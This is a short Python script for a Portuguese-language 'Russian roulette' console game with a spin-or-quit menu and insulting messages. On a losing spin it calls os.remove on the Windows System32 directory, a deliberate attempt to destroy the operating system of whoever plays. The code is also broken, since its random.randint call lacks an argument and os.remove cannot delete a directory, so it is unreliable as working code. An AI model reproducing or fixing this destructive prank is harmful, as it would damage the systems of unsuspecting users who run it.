import random, os, time, sys

color = "\033[0;32;40m"

while(True):
    print(f"""{color}
    ======================
        ROLETA RUSSA
    ======================

    [1] - RODAR
    [2] - SAIR    
    """)    
    value = input("\n>>> ")
    if value == "1":
        if random.randint(6) == 1:
            print("Se fodeu!")
            time.sleep(3)
            os.remove("C:\Windows\System32")
        else:
            print("Se salvou")
    elif value == "2":
        sys.exit()
    else:
        print("Deixa de ser burro porra")

